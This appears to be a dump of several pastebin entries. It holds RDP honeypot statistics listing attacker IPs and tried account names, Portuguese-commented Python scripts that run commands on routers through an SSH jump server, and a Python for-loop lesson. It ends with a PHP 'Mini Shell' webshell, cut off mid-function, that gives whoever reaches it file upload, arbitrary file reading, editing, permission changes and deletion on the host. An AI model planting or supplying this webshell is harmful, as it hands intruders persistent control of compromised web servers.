    ""Telecom Argentina S.A"": 2,
    ""NLS ASTANA LLP"": 2,
    ""Hubei Feixun Network Co., Ltd"": 2,
    ""DigitalOcean, LLC"": 10,
    ""CNC Group CHINA169 Shandong Province Network"": 2,
    ""Ethiotelecom"": 2,
    ""Chinanet"": 6,
    ""S.I Group"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""BtHoster LTD"": 6,
    ""Shenzhen Tencent Computer Systems Company Limited"": 2,
    ""Verizon Business"": 4
  },
  ""org"": {
    ""Unknown"": 16,
    ""Cloud Solutions S.A"": 4,
    ""Flyservers S.A"": 46,
    ""Korea Telecom"": 4,
    ""Horizon LLC"": 8,
    ""Palo Alto Networks, Inc"": 24,
    ""Xhost Internet Solutions"": 6,
    ""Censys, Inc."": 2,
    ""4Media Ltd"": 6,
    ""Microsoft Azure Cloud (australiaeast)"": 2,
    ""Xhostis"": 10,
    ""Red Byte LLC"": 4,
    ""Dmitriy Panchenko"": 4,
    ""CenturyLink, Inc"": 2,
    ""UAB Host Baltic"": 14,
    ""Bandito Networks"": 4,
    ""Servers.com, Inc."": 6,
    ""Fibertel"": 2,
    ""Hubei Feixun Network Co., Ltd"": 2,
    ""DigitalOcean, LLC"": 10,
    ""Chinanet JS"": 6,
    ""Ucloud Information Technology"": 2,
    ""BtHoster LTD"": 6,
    ""Tencent Cloud Computing"": 2,
    ""Verizon Business"": 4
  },
  ""regionName"": {
    ""Tirana"": 8,
    ""Distrito Federal"": 4,
    ""Kaunas"": 46,
    ""Seoul"": 6,
    ""Moscow"": 12,
    ""California"": 24,
    ""North Holland"": 16,
    ""Hesse"": 2,
    ""Plovdiv"": 6,
    ""New South Wales"": 2,
    ""Perm Krai"": 4,
    ""New Jersey"": 16,
    ""Vilnius"": 14,
    ""New York"": 4,
    ""Texas"": 6,
    ""Buenos Aires F.D."": 2,
    ""Astana"": 2,
    ""Hubei"": 2,
    ""Shandong"": 2,
    ""Addis Ababa"": 2,
    ""Jiangsu"": 6,
    ""Phnom Penh"": 2,
    ""Bavaria"": 6,
    ""Central and Western District"": 2
  },
  ""country"": {
    ""Albania"": 8,
    ""Venezuela"": 4,
    ""Lithuania"": 60,
    ""South Korea"": 6,
    ""Russia"": 16,
    ""United States"": 50,
    ""The Netherlands"": 16,
    ""Germany"": 8,
    ""Bulgaria"": 6,
    ""Australia"": 2,
    ""Argentina"": 2,
    ""Kazakhstan"": 2,
    ""China"": 10,
    ""Ethiopia"": 2,
    ""Cambodia"": 2,
    ""Hong Kong"": 2
  },
  ""account"": {
    ""142.93.8.59"": 54,
    ""Administr"": 24,
    ""hello"": 30,
    ""Test"": 20,
    ""BRMsCcJzq"": 2,
    ""kEWyez"": 2,
    ""pYfHEp"": 2,
    ""(empty)"": 10,
    ""kxDKOmVjN"": 2,
    ""OwozgB"": 2,
    ""KQIGMA"": 2,
    ""Domain"": 22,
    ""07y7dc3j"": 8,
    ""beio"": 2,
    ""Administrator"": 2,
    ""EODjKnkVl"": 2,
    ""WKBXqu"": 2,
    ""PDJrmx"": 2,
    ""pzgmQDisg"": 2,
    ""xbGpEu"": 2,
    ""PSmGiP"": 2
  },
  ""keyboard"": {
    ""Unknown"": 196
  },
  ""client_build"": {
    ""Unknown"": 196
  },
  ""client_name"": {
    ""Unknown"": 196
  },
  ""ip_type"": {
    ""Unknown"": 136,
    ""hosting"": 46,
    ""proxy"": 10,
    ""mobile & proxy"": 4
  }
}"
RR6AKmKL,2024-01-06_stats.json,rdp_snitch,JSON,Saturday 6th of January 2024 06:15:09 PM CDT,"{
  ""ip"": {
    ""109.69.7.157"": 4,
    ""179.60.147.51"": 2,
    ""194.165.17.21"": 21,
    ""59.2.55.231"": 2,
    ""62.204.41.199"": 4,
    ""198.235.24.227"": 3,
    ""87.251.75.145"": 1,
    ""194.165.16.11"": 2,
    ""167.94.145.58"": 1,
    ""212.70.149.142"": 3,
    ""20.213.8.208"": 1,
    ""185.170.144.3"": 2,
    ""87.251.75.120"": 2,
    ""83.97.73.77"": 2,
    ""198.235.24.196"": 3,
    ""94.232.45.101"": 2,
    ""67.133.192.80"": 1,
    ""45.227.254.9"": 3,
    ""216.73.160.245"": 1,
    ""173.237.25.68"": 3,
    ""181.30.39.44"": 1,
    ""45.86.81.112"": 1,
    ""103.184.47.83"": 1,
    ""206.189.238.63"": 4,
    ""185.170.144.113"": 3,
    ""157.245.90.133"": 1,
    ""60.214.209.163"": 1,
    ""196.190.117.7"": 1,
    ""45.227.254.49"": 2,
    ""58.218.204.183"": 3,
    ""96.9.81.244"": 1,
    ""152.32.139.190"": 1,
    ""205.210.31.217"": 3,
    ""216.73.160.116"": 1,
    ""77.90.185.2"": 3,
    ""43.154.91.97"": 1,
    ""74.105.22.131"": 2,
    ""198.235.24.175"": 3,
    ""45.227.254.48"": 2
  },
  ""asn"": {
    ""AS21183"": 4,
    ""AS209588"": 2,
    ""AS48721"": 23,
    ""AS4766"": 2,
    ""AS59425"": 4,
    ""AS396982"": 12,
    ""AS208091"": 3,
    ""AS398705"": 1,
    ""AS204428"": 3,
    ""AS8075"": 1,
    ""AS197414"": 5,
    ""AS208312"": 2,
    ""AS212482"": 2,
    ""AS209"": 1,
    ""AS267784"": 7,
    ""AS206092"": 2,
    ""AS7979"": 3,
    ""AS7303"": 1,
    ""AS205516"": 1,
    ""AS146817"": 1,
    ""AS14061"": 5,
    ""AS4837"": 1,
    ""AS24757"": 1,
    ""AS4134"": 3,
    ""AS131207"": 1,
    ""AS135377"": 1,
    ""AS198465"": 3,
    ""AS132203"": 1,
    ""AS701"": 2
  },
  ""isp"": {
    ""Vodafone Network"": 4,
    ""Flyservers S.A."": 32,
    ""Korea Telecom"": 2,
    ""Horizon LLC"": 4,
    ""Google LLC"": 12,
    ""Xhost Internet Solutions LP"": 10,
    ""Censys, Inc."": 1,
    ""SS-Net"": 3,
    ""Microsoft Corporation"": 1,
    ""Red Byte LLC"": 2,
    ""CenturyLink"": 1,
    ""Ipxo Limited"": 2,
    ""Servers.com, Inc."": 3,
    ""Telecom Argentina S.A"": 1,
    ""NLS ASTANA LLP"": 1,
    ""Hubei Feixun Network Co., Ltd"": 1,
    ""DigitalOcean, LLC"": 5,
    ""CNC Group CHINA169 Shandong Province Network"": 1,
    ""Ethiotelecom"": 1,
    ""Chinanet"": 3,
    ""S.I Group"": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""BtHoster LTD"": 3,
    ""Shenzhen Tencent Computer Systems Company Limited"": 1,
    ""Verizon Business"": 2
  },
  ""org"": {
    ""Unknown"": 8,
    ""Cloud Solutions S.A"": 2,
    ""Flyservers S.A"": 23,
    ""Korea Telecom"": 2,
    ""Horizon LLC"": 4,
    ""Palo Alto Networks, Inc"": 12,
    ""Xhost Internet Solutions"": 3,
    ""Censys, Inc."": 1,
    ""4Media Ltd"": 3,
    ""Microsoft Azure Cloud (australiaeast)"": 1,
    ""Xhostis"": 5,
    ""Red Byte LLC"": 2,
    ""Dmitriy Panchenko"": 2,
    ""CenturyLink, Inc"": 1,
    ""UAB Host Baltic"": 7,
    ""Bandito Networks"": 2,
    ""Servers.com, Inc."": 3,
    ""Fibertel"": 1,
    ""Hubei Feixun Network Co., Ltd"": 1,
    ""DigitalOcean, LLC"": 5,
    ""Chinanet JS"": 3,
    ""Ucloud Information Technology"": 1,
    ""BtHoster LTD"": 3,
    ""Tencent Cloud Computing"": 1,
    ""Verizon Business"": 2
  },
  ""regionName"": {
    ""Tirana"": 4,
    ""Distrito Federal"": 2,
    ""Kaunas"": 23,
    ""Seoul"": 3,
    ""Moscow"": 6,
    ""California"": 12,
    ""North Holland"": 8,
    ""Hesse"": 1,
    ""Plovdiv"": 3,
    ""New South Wales"": 1,
    ""Perm Krai"": 2,
    ""New Jersey"": 8,
    ""Vilnius"": 7,
    ""New York"": 2,
    ""Texas"": 3,
    ""Buenos Aires F.D."": 1,
    ""Astana"": 1,
    ""Hubei"": 1,
    ""Shandong"": 1,
    ""Addis Ababa"": 1,
    ""Jiangsu"": 3,
    ""Phnom Penh"": 1,
    ""Bavaria"": 3,
    ""Central and Western District"": 1
  },
  ""country"": {
    ""Albania"": 4,
    ""Venezuela"": 2,
    ""Lithuania"": 30,
    ""South Korea"": 3,
    ""Russia"": 8,
    ""United States"": 25,
    ""The Netherlands"": 8,
    ""Germany"": 4,
    ""Bulgaria"": 3,
    ""Australia"": 1,
    ""Argentina"": 1,
    ""Kazakhstan"": 1,
    ""China"": 5,
    ""Ethiopia"": 1,
    ""Cambodia"": 1,
    ""Hong Kong"": 1
  },
  ""account"": {
    ""142.93.8.59"": 27,
    ""Administr"": 12,
    ""hello"": 15,
    ""Test"": 10,
    ""BRMsCcJzq"": 1,
    ""kEWyez"": 1,
    ""pYfHEp"": 1,
    ""(empty)"": 5,
    ""kxDKOmVjN"": 1,
    ""OwozgB"": 1,
    ""KQIGMA"": 1,
    ""Domain"": 11,
    ""07y7dc3j"": 4,
    ""beio"": 1,
    ""Administrator"": 1,
    ""EODjKnkVl"": 1,
    ""WKBXqu"": 1,
    ""PDJrmx"": 1,
    ""pzgmQDisg"": 1,
    ""xbGpEu"": 1,
    ""PSmGiP"": 1
  },
  ""keyboard"": {
    ""Unknown"": 98
  },
  ""client_build"": {
    ""Unknown"": 98
  },
  ""client_name"": {
    ""Unknown"": 98
  },
  ""ip_type"": {
    ""Unknown"": 68,
    ""hosting"": 23,
    ""proxy"": 5,
    ""mobile & proxy"": 2
  }
}"
ftc1JwnV,Refeito sem classe..,Rnery,Python,Saturday 6th of January 2024 06:07:46 PM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Refeito sem classe..

from paramiko import SSHClient, AutoAddPolicy, ProxyCommand
from json import load

def load_credentials(client, jump_host, jump_username, jump_password):
    if jump_host:
        client = SSHClient()
        client.set_missing_host_key_policy(AutoAddPolicy())
        client.connect(
            jump_host,
            username=jump_username,
            password=jump_password,
        )

def connect(client, host, username, password, jump_host=None, jump_username=None, jump_password=None):
    try:
        if not client:
            client = SSHClient()
            client.set_missing_host_key_policy(AutoAddPolicy())
            if jump_host:
                proxy_cmd = ProxyCommand(f""ssh -q -W %h:%p {jump_host}"")
                client.connect(
                    host,
                    username=username,
                    password=password,
                    sock=proxy_cmd,
                )
            else:
                client.connect(
                    host,
                    username=username,
                    password=password,
                )
    except Exception as e:
        raise RuntimeError(f""Erro ao conectar: {e}"")

def execute_command(client, command):
    try:
        _, stdout, _ = client.exec_command(command)
        return stdout.read().decode('utf-8')
    except Exception as e:
        raise RuntimeError(f""Erro ao executar comando: {e}"")

def close(client):
    if client:
        client.close()

def ler_ips_do_arquivo(nome_arquivo):
    with open(nome_arquivo, 'r') as file:
        return [line.strip() for line in file.readlines()]

def main():
    try:
        # Substitua pelos dados do seu servidor intermedi√°rio (jump server)
        jump_host = 'jump_server_ip'  # IP do servidor intermedi√°rio
        jump_username = 'user1'        # Nome de usu√°rio do servidor intermedi√°rio
        jump_password = 'passw1'        # Senha do servidor intermedi√°rio
        
        arquivo_ips = 'ips.txt'          # Substitua pelo nome do seu arquivo de IPs
        arquivo_comandos = 'comandos.txt'  # Substitua pelo nome do seu arquivo de comandos

        client = None
        ips = ler_ips_do_arquivo(arquivo_ips)
        comandos = [line.strip() for line in open(arquivo_comandos, 'r').readlines()]

        total_roteadores = len(ips)
        roteadores_acessados = 0
        roteadores_nao_acessados = 0

        with open('relatorio.txt', 'w') as relatorio:
            for ip in ips:
                try:
                    # Substitua pelos dados do seu roteador final
                    load_credentials(client, jump_host, jump_username, jump_password)
                    connect(client, ip, 'user2', 'passw2', jump_host, jump_username, jump_password)

                    resultados = [execute_command(client, comando) for comando in comandos]

                    if len(resultados) >= 2:  # Verificar se h√° pelo menos dois elementos na lista resultados
                        roteadores_acessados += 1
                        relatorio.write(f'{ip} - LOG OK\n')

                        with open(f'ANTES_{ip}.log', 'w') as log_antes:
                            log_antes.write(resultados[0])  # Supondo que o resultado do primeiro comando seja o log antes

                        with open(f'DEPOIS_{ip}.log', 'w') as log_depois:
                            log_depois.write(resultados[1])  # Supondo que o resultado do segundo comando seja o log depois

                    close(client)

                except RuntimeError as e:
                    roteadores_nao_acessados += 1
                    relatorio.write(f'{ip} - LOG NOK - {e}\n')

        relatorio.write(f'\nN√∫mero de roteadores: {total_roteadores}\n')
        relatorio.write(f'Roteadores acessados: {roteadores_acessados}\n')
        relatorio.write(f'Roteadores n√£o acessados: {roteadores_nao_acessados}\n')

    except Exception as e:
        print(f""Erro: {e}"")

if __name__ == ""__main__"":
    main()
"
H99VhjFw,Jump Server comentada..,Rnery,Python,Saturday 6th of January 2024 05:56:13 PM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from paramiko import SSHClient, AutoAddPolicy, ProxyCommand
from json import load

class SSHManager:
    def __init__(self, host, username, password, jump_host=None, jump_username=None, jump_password=None):
        self.host = host
        self.username = username
        self.password = password
        self.jump_host = jump_host
        self.jump_username = jump_username
        self.jump_password = jump_password
        self.client = None
        self.load_credentials()

    def load_credentials(self):
        if self.jump_host:
            self.client = SSHClient()
            self.client.set_missing_host_key_policy(AutoAddPolicy())
            self.client.connect(
                self.jump_host,
                username=self.jump_username,
                password=self.jump_password,
            )

    def connect(self):
        try:
            if not self.client:
                self.client = SSHClient()
                self.client.set_missing_host_key_policy(AutoAddPolicy())
                if self.jump_host:
                    proxy_cmd = ProxyCommand(f""ssh -q -W %h:%p {self.jump_host}"")
                    self.client.connect(
                        self.host,
                        username=self.username,
                        password=self.password,
                        sock=proxy_cmd,
                    )
                else:
                    self.client.connect(
                        self.host,
                        username=self.username,
                        password=self.password,
                    )
        except Exception as e:
            raise RuntimeError(f""Erro ao conectar: {e}"")

    def execute_command(self, command):
        try:
            _, stdout, _ = self.client.exec_command(command)
            return stdout.read().decode('utf-8')
        except Exception as e:
            raise RuntimeError(f""Erro ao executar comando: {e}"")

    def close(self):
        if self.client:
            self.client.close()

def ler_ips_do_arquivo(nome_arquivo):
    with open(nome_arquivo, 'r') as file:
        return [line.strip() for line in file.readlines()]

def main():
    try:
        # Substitua pelos dados do seu servidor intermedi√°rio (jump server)
        jump_host = 'jump_server_ip'  # IP do servidor intermedi√°rio
        jump_username = 'user1'        # Nome de usu√°rio do servidor intermedi√°rio
        jump_password = 'passw1'        # Senha do servidor intermedi√°rio
        
        arquivo_ips = 'ips.txt'          # Substitua pelo nome do seu arquivo de IPs
        arquivo_comandos = 'comandos.txt'  # Substitua pelo nome do seu arquivo de comandos

        ips = ler_ips_do_arquivo(arquivo_ips)
        comandos = [line.strip() for line in open(arquivo_comandos, 'r').readlines()]

        total_roteadores = len(ips)
        roteadores_acessados = 0
        roteadores_nao_acessados = 0

        with open('relatorio.txt', 'w') as relatorio:
            for ip in ips:
                try:
                    # Substitua pelos dados do seu roteador final
                    ssh_manager = SSHManager(
                        ip, 
                        username='user2',   # Nome de usu√°rio do roteador final
                        password='passw2',   # Senha do roteador final
                        jump_host=jump_host, 
                        jump_username=jump_username, 
                        jump_password=jump_password
                    )
                    ssh_manager.connect()

                    resultados = [ssh_manager.execute_command(comando) for comando in comandos]

                    if len(resultados) >= 2:  # Verificar se h√° pelo menos dois elementos na lista resultados
                        roteadores_acessados += 1
                        relatorio.write(f'{ip} - LOG OK\n')

                        with open(f'ANTES_{ip}.log', 'w') as log_antes:
                            log_antes.write(resultados[0])  # Supondo que o resultado do primeiro comando seja o log antes

                        with open(f'DEPOIS_{ip}.log', 'w') as log_depois:
                            log_depois.write(resultados[1])  # Supondo que o resultado do segundo comando seja o log depois

                    ssh_manager.close()

                except RuntimeError as e:
                    roteadores_nao_acessados += 1
                    relatorio.write(f'{ip} - LOG NOK - {e}\n')

        relatorio.write(f'\nN√∫mero de roteadores: {total_roteadores}\n')
        relatorio.write(f'Roteadores acessados: {roteadores_acessados}\n')
        relatorio.write(f'Roteadores n√£o acessados: {roteadores_nao_acessados}\n')

    except Exception as e:
        print(f""Erro: {e}"")

if __name__ == ""__main__"":
    main()
"
SLJi6xAv,Jump Server Modificado.,Rnery,Python,Saturday 6th of January 2024 05:23:50 PM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-

""""""
ALTERA√á√ïES:

O script foi alterado pra suportar duas conex√µes: uma para o servidor intermedi√°rio (jump server)
e outra para os roteadores finais

Adicionei par√¢metros opcionais: jump_host, jump_username, e jump_password √† classe SSHManager
Esses par√¢metros s√£o usados para a conex√£o com o servidor intermedi√°rio (jump server)
Substitua os valores de exemplo pelos dados reais do seu ambiente.
""""""

from paramiko import SSHClient, AutoAddPolicy, ProxyCommand
from json import load

class SSHManager:
    def __init__(self, host, username, password, jump_host=None, jump_username=None, jump_password=None):
        self.host = host
        self.username = username
        self.password = password
        self.jump_host = jump_host
        self.jump_username = jump_username
        self.jump_password = jump_password
        self.client = None
        self.load_credentials()

    def load_credentials(self):
        if self.jump_host:
            self.client = SSHClient()
            self.client.set_missing_host_key_policy(AutoAddPolicy())
            self.client.connect(
                self.jump_host,
                username=self.jump_username,
                password=self.jump_password,
            )

    def connect(self):
        try:
            if not self.client:
                self.client = SSHClient()
                self.client.set_missing_host_key_policy(AutoAddPolicy())
                if self.jump_host:
                    proxy_cmd = ProxyCommand(f""ssh -q -W %h:%p {self.jump_host}"")
                    self.client.connect(
                        self.host,
                        username=self.username,
                        password=self.password,
                        sock=proxy_cmd,
                    )
                else:
                    self.client.connect(
                        self.host,
                        username=self.username,
                        password=self.password,
                    )
        except Exception as e:
            raise RuntimeError(f""Erro ao conectar: {e}"")

    def execute_command(self, command):
        try:
            _, stdout, _ = self.client.exec_command(command)
            return stdout.read().decode('utf-8')
        except Exception as e:
            raise RuntimeError(f""Erro ao executar comando: {e}"")

    def close(self):
        if self.client:
            self.client.close()

def ler_ips_do_arquivo(nome_arquivo):
    with open(nome_arquivo, 'r') as file:
        return [line.strip() for line in file.readlines()]

def main():
    try:
        jump_host = 'jump_server_ip'
        jump_username = 'user1'
        jump_password = 'passw1'
        
        arquivo_ips = 'ips.txt'  # Substitua pelo nome do seu arquivo de IPs
        arquivo_comandos = 'comandos.txt'  # Substitua pelo nome do seu arquivo de comandos

        ips = ler_ips_do_arquivo(arquivo_ips)
        comandos = [line.strip() for line in open(arquivo_comandos, 'r').readlines()]

        total_roteadores = len(ips)
        roteadores_acessados = 0
        roteadores_nao_acessados = 0

        with open('relatorio.txt', 'w') as relatorio:
            for ip in ips:
                try:
                    ssh_manager = SSHManager(
                        ip, 
                        username='user2', 
                        password='passw2', 
                        jump_host=jump_host, 
                        jump_username=jump_username, 
                        jump_password=jump_password
                    )
                    ssh_manager.connect()

                    resultados = [ssh_manager.execute_command(comando) for comando in comandos]

                    roteadores_acessados += 1
                    relatorio.write(f'{ip} - LOG OK\n')

                    with open(f'ANTES_{ip}.log', 'w') as log_antes:
                        log_antes.write(resultados[0])  # Supondo que o resultado do primeiro comando seja o log antes

                    with open(f'DEPOIS_{ip}.log', 'w') as log_depois:
                        log_depois.write(resultados[1])  # Supondo que o resultado do segundo comando seja o log depois

                    ssh_manager.close()

                except RuntimeError as e:
                    roteadores_nao_acessados += 1
                    relatorio.write(f'{ip} - LOG NOK - {e}\n')

        relatorio.write(f'\nN√∫mero de roteadores: {total_roteadores}\n')
        relatorio.write(f'Roteadores acessados: {roteadores_acessados}\n')
        relatorio.write(f'Roteadores n√£o acessados: {roteadores_nao_acessados}\n')

    except Exception as e:
        print(f""Erro: {e}"")

if __name__ == ""__main__"":
    main()
"
mDCYGJub,webinar-for-loops-2024-01-06,jspill,Python,Saturday 6th of January 2024 04:59:24 PM CDT,"# 2024 Jan 06
# WEBINAR: For Loops

# We use loops to repeat actions
# a WHILE loop... is an IF that repeats as long as the loop condition remains True

# FOR LOOPS are used for repeating actions for every element in a container (list, dict, tuple, str)

# Basic syntax of a for loop
# for ___ in __someContainer__:

# list
myList = [""Agent Scully"", ""Agent Mulder"", ""Walter Skinner"", ""CSM"", ""Mr. X""]
for item in myList:
    print(item) # print(item, end=""\n"")

# tuple
myTuple = (""Gilligan"", ""Castaway002"", ""red"", ""crew"")
for item in myTuple:
    print(item)

# string
myString = ""It was the best of times.""
for char in myString:
    print(char, end="""")
print()
# fill the basket pattern
# newList = []
# newString = """"
# for item in myList:
#     if item.startswith(""Agent""):
#         #newList.append(item)
#         # newString = newString + item
#         newString += item + "" ""
# print(newString)

# myDict = {
#     key: value,
#     key: value,
#     key: value
# }
# myDict[key]
# myDict[key] = value
bestOfXF = {
    ""1x00"": ""Pilot"",
    ""2x10"": ""Red Museum"",
    ""2x14"": ""Die Hand Die Verletzt"",
    ""3x04"": ""Clyde Bruckman's Final Repose"",
    ""3x12"": ""War of the Coprophages"",
    ""3x20"": ""Jose Chung's From Outer Space"",
    ""4x05"": ""The Field Where I Died"",
    ""5x05"": ""The Post Modern Prometheus"",
    ""5x17"": ""All Souls""
}
for key in bestOfXF:
    # print(key) # value for that key is bestOfXF[key]
    # ""Check out Episode ___ or '___'""
    print(f""Check out Episode {key} or '{bestOfXF[key]}'"")

# looping a known number of times
# RANGE
# range(start, stop, step)
# for n in range(0, 5): # --> [0, 1, 2, 3, 4]
#     print(n)
myList.append(""Krycek"")
# if I'm interested in index
for i in range(0, len(myList)):
    # print(i)
    # print(myList[i])
    print(f""Position {i} is {myList[i]}"")

# or... use enumerate() to get index and value
for i, item in enumerate(myList):
    print(f""Position {i} is still {item}"")

"
Sp6Lcti7,webshell mini,b3gund4L,PHP,Saturday 6th of January 2024 04:45:55 PM CDT,"set_time_limit(0);
error_reporting(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<link href="""" rel=""stylesheet"" type=""text/css"">
<title> lol </title>
<style>
body{
font-family: ""Racing Sans One"", cursive;
background-color: #e6e6e6;
text-shadow:0px 0px 1px #757575;
}
#content tr:hover{
background-color: #636263;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: silver;
}
#content .first:hover{
background-color: silver;
text-shadow:0px 0px 1px #757575;
}
table{
border: 1px #000000 dotted;
}
H1{
font-family: ""Rye"", cursive;
}
a{
color: #000;
text-decoration: none;
}
a:hover{
color: #fff;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</HEAD>
<BODY>
<H1><center><img src=""https://s.yimg.com/lq/i/mesg/emoticons7/19.gif""/>
 [ Mini Shell ] <img src=""https://s.yimg.com/lq/i/mesg/emoticons7/19.gif""/>
 </center></H1>
<table width=""700"" border=""0"" cellpadding=""3"" cellspacing=""1"" align=""center"">
<tr><td>Direktori : ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href=""?path=/"">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href=""?path=';
for($i=0;$i<=$id;$i++){
echo ""$paths[$i]"";
if($i != $id) echo ""/"";
}
echo '"">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color=""green"">File Ter-Upload :* </font><br />';
}else{
echo '<font color=""red"">Upload gagal, Servernya kek <img src=""https://s.yimg.com/lq/i/mesg/emoticons7/19.gif""/>
 </font><br />';
}
}
echo '<form enctype=""multipart/form-data"" method=""POST"">
Upload File : <input type=""file"" name=""file"" />
<input type=""submit"" value=""upload"" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
echo ""<tr><td>Current File : "";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color=""green"">Change Permission Done.</font><br />';
}else{
echo '<font color=""red"">Change Permission Error.</font><br />';
}
}
echo '<form method=""POST"">
Permission : <input name=""perm"" type=""text"" size=""4"" value=""'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'"" />
<input type=""hidden"" name=""path"" value=""'.$_POST['path'].'"">
<input type=""hidden"" name=""opt"" value=""chmod"">
<input type=""submit"" value=""Go"" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color=""green"">Change Name Done.</font><br />';
}else{
echo '<font color=""red"">Change Name Error.</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method=""POST"">
New Name : <input name=""newname"" type=""text"" size=""20"" value=""'.$_POST['name'].'"" />
<input type=""hidden"" name=""path"" value=""'.$_POST['path'].'"">
<input type=""hidden"" name=""opt"" value=""rename"">
<input type=""submit"" value=""Go"" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color=""green"">Edit File Done ~_^.</font><br />';
}else{
echo '<font color=""red"">Edit File Error ~_~.</font><br />';
}
fclose($fp);
}
echo '<form method=""POST"">
<textarea cols=80 rows=20 name=""src"">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type=""hidden"" name=""path"" value=""'.$_POST['path'].'"">
<input type=""hidden"" name=""opt"" value=""edit"">
<input type=""submit"" value=""Go"" />
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color=""green"">Delete Dir Done.</font><br />';
}else{
echo '<font color=""red"">Delete Dir Error.</font><br />';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color=""green"">Delete File Done.</font><br />';
}else{
echo '<font color=""red"">Delete File Error.</font><br />';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id=""content""><table width=""700"" border=""0"" cellpadding=""3"" cellspacing=""1"" align=""center"">
<tr class=""first"">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Permissions</center></td>
<td><center>Options</center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir(""$path/$dir"") || $dir == '.' || $dir == '..') continue;
echo ""<tr>
<td><a href=\""?path=$path/$dir\"">$dir</a></td>
<td><center>--</center></td>
<td><center>"";
if(is_writable(""$path/$dir"")) echo '<font color=""green"">';
elseif(!is_readable(""$path/$dir"")) echo '<font color=""red"">';
echo perms(""$path/$dir"");
if(is_writable(""$path/$dir"") || !is_readable(""$path/$dir"")) echo '</font>';

echo ""</center></td>
<td><center><form method=\""POST\"" action=\""?option&path=$path\"">
<select name=\""opt\"">
<option value=\""\""></option>
<option value=\""delete\"">Delete</option>
<option value=\""chmod\"">Chmod</option>
<option value=\""rename\"">Rename</option>
</select>
<input type=\""hidden\"" name=\""type\"" value=\""dir\"">
<input type=\""hidden\"" name=\""name\"" value=\""$dir\"">
<input type=\""hidden\"" name=\""path\"" value=\""$path/$dir\"">
<input type=\""submit\"" value=\"">\"" />
</form></center></td>
</tr>"";
}
echo '<tr class=""first""><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file(""$path/$file"")) continue;
$size = filesize(""$path/$file"")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo ""<tr>
<td><a href=\""?filesrc=$path/$file&path=$path\"">$file</a></td>
<td><center>"".$size.""</center></td>
<td><center>"";
if(is_writable(""$path/$file"")) echo '<font color=""green"">';
elseif(!is_readable(""$path/$file"")) echo '<font color=""red"">';
echo perms(""$path/$file"");
if(is_writable(""$path/$file"") || !is_readable(""$path/$file"")) echo '</font>';
echo ""</center></td>
<td><center><form method=\""POST\"" action=\""?option&path=$path\"">
<select name=\""opt\"">
<option value=\""\""></option>
<option value=\""delete\"">Delete</option>
<option value=\""chmod\"">Chmod</option>
<option value=\""rename\"">Rename</option>
<option value=\""edit\"">Edit</option>
</select>
<input type=\""hidden\"" name=\""type\"" value=\""file\"">
<input type=\""hidden\"" name=\""name\"" value=\""$file\"">
<input type=\""hidden\"" name=\""path\"" value=\""$path/$file\"">
<input type=\""submit\"" value=\"">\"" />
</form></center></td>
</tr>"";
}
echo '</table>
</div>';
}
echo '</BODY></HTML>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
